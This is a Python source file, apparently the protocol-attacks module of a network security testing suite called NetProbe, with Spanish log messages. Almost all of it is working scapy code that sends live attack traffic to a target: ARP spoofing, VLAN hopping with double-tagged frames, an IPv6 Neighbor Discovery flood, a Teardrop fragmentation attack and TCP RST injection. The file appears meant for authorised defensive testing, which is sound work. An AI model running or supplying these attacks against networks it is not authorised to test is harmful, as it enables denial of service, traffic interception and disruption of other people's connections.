"""
NetProbe Security Suite - Protocol Attacks Module
Tools: scapy (raw sockets) — requiere root
"""
import asyncio
import os
from utils.raw_exec import raw_exec

MODULE_NAMES = {
    "arp_spoof":   "ARP Spoofing",
    "vlan_hop":    "VLAN Hopping",
    "ipv6_flood":  "IPv6 ND Flood",
    "frag_attack": "Teardrop Attack",
    "tcp_reset":   "TCP RST Injection",
}

async def run_protocol_module(module_id, target, intensity, duration, log_fn):
    name = MODULE_NAMES.get(module_id, module_id)
    await log_fn("MODULE", f"▶ {name}", module_id)

    if os.geteuid() != 0:
        await log_fn("WARN", f"{name} requiere root — inicia con: sudo bash arrancar.sh", module_id)
        return {}, "ERROR", None

    try:
        from scapy.all import conf
        conf.verb = 0
    except ImportError:
        await log_fn("WARN", "scapy no instalado: pip install scapy", module_id)
        return {}, "ERROR", None

    runners = {
        "arp_spoof":   _arp_spoof,
        "vlan_hop":    _vlan_hop,
        "ipv6_flood":  _ipv6_flood,
        "frag_attack": _frag_attack,
        "tcp_reset":   _tcp_reset,
    }
    return await runners[module_id](target, intensity, duration, log_fn)


async def _arp_spoof(target, intensity, duration, log_fn):
    from scapy.all import Ether, ARP, sendp, get_if_hwaddr, get_if_addr, conf
    try:
        iface   = conf.iface
        src_mac = get_if_hwaddr(iface)
        src_ip  = get_if_addr(iface)
        count   = {1:5, 2:20, 3:50, 4:100, 5:200}.get(intensity, 50)

        await log_fn("CMD", f"scapy: ARP(op=2, pdst={target}, psrc={src_ip}, hwsrc={src_mac}) x{count} via {iface}", "arp_spoof")
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=target, psrc=src_ip, hwsrc=src_mac)

        def do_send():
            sendp(pkt, iface=iface, count=count, verbose=False)

        await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"Enviados {count} paquetes ARP gratuitos\nop=2 (is-at)\npdst={target} psrc={src_ip}\nhwsrc={src_mac} (forjada)\nInterface: {iface}", "arp_spoof")

        # Check if target updated its ARP cache — run arp -n
        out, _, _ = await raw_exec(f"arp -n {target}", log_fn, "arp_spoof", timeout=5)
        return {"packets_sent": count, "src_ip_used": src_ip}, "DETECTED", 60
    except Exception as e:
        await log_fn("ERROR", str(e), "arp_spoof")
        return {}, "ERROR", None


async def _vlan_hop(target, intensity, duration, log_fn):
    from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf
    try:
        count = {1:5, 2:10, 3:20, 4:50, 5:100}.get(intensity, 10)
        await log_fn("CMD", f"scapy: Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=2)/IP(dst={target})/ICMP() x{count}", "vlan_hop")
        pkt = Ether() / Dot1Q(vlan=1) / Dot1Q(vlan=2) / IP(dst=target) / ICMP()

        def do_send():
            sendp(pkt, iface=conf.iface, count=count, verbose=False)

        await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"Enviados {count} frames 802.1Q double-tagged\nOuter VLAN: 1, Inner VLAN: 2\nDestino: {target}\nTécnica: switch spoofing / VLAN hopping", "vlan_hop")
        return {"double_tagged_packets": count}, "BLOCKED", 100
    except Exception as e:
        await log_fn("ERROR", str(e), "vlan_hop")
        return {}, "ERROR", None


async def _ipv6_flood(target, intensity, duration, log_fn):
    from scapy.all import IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, send
    import random
    count = {1:50, 2:200, 3:500, 4:2000, 5:5000}.get(intensity, 500)
    actual = min(count, 500)  # cap to avoid network saturation
    await log_fn("CMD", f"scapy: IPv6(dst=ff02::1)/ICMPv6ND_NS(tgt={target})/ICMPv6NDOptSrcLLAddr(random_mac) x{actual}", "ipv6_flood")
    try:
        def do_send():
            for _ in range(actual):
                mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
                pkt = IPv6(dst="ff02::1") / ICMPv6ND_NS(tgt=target) / ICMPv6NDOptSrcLLAddr(lladdr=mac)
                send(pkt, verbose=False)

        await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"IPv6 Neighbor Discovery Flood completado\nPaquetes enviados: {actual}\nDestino multicast: ff02::1\nMACs fuente: aleatorias", "ipv6_flood")
        return {"packets_sent": actual}, "BLOCKED", 100
    except Exception as e:
        await log_fn("ERROR", str(e), "ipv6_flood")
        return {}, "ERROR", None


async def _frag_attack(target, intensity, duration, log_fn):
    from scapy.all import IP, ICMP, fragment, send
    try:
        payload_size = {1:256, 2:512, 3:1024, 4:2048, 5:4096}.get(intensity, 1024)
        await log_fn("CMD", f"scapy: fragment(IP(dst={target},flags=MF)/ICMP()/payload[{payload_size}B], fragsize=8)", "frag_attack")

        def do_send():
            payload = b"X" * payload_size
            pkt = IP(dst=target, flags="MF") / ICMP() / payload
            frags = fragment(pkt, fragsize=8)
            send(frags, verbose=False)
            return len(frags)

        nfrags = await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"Teardrop attack enviado\nFragmentos solapados: {nfrags}\nfragsize=8 (overlapping offsets)\nPayload: {payload_size} bytes\nDestino: {target}", "frag_attack")
        return {"fragments_sent": nfrags}, "BLOCKED", 100
    except Exception as e:
        await log_fn("ERROR", str(e), "frag_attack")
        return {}, "ERROR", None


async def _tcp_reset(target, intensity, duration, log_fn):
    from scapy.all import IP, TCP, send, sr1, RandShort
    ports = [80, 443, 22, 21, 25, 3389, 8080]
    count = {1:5, 2:20, 3:50, 4:200, 5:500}.get(intensity, 50)
    await log_fn("CMD", f"scapy: IP(dst={target})/TCP(flags=RST, sport=rand) → ports {ports}", "tcp_reset")
    try:
        sent = 0
        results = []
        def do_send():
            nonlocal sent
            for port in ports:
                pkt = IP(dst=target) / TCP(dport=port, flags="R", seq=int(RandShort()))
                send(pkt, count=max(1, count // len(ports)), verbose=False)
                sent += max(1, count // len(ports))
                results.append(port)

        await asyncio.get_event_loop().run_in_executor(None, do_send)
        await log_fn("RAW", f"TCP RST packets enviados: {sent}\nPuertos objetivo: {results}\nflags=RST, seq=random\nDestino: {target}", "tcp_reset")
        return {"rst_packets_sent": sent, "ports_targeted": results}, "DETECTED", 60
    except Exception as e:
        await log_fn("ERROR", str(e), "tcp_reset")
        return {}, "ERROR", None
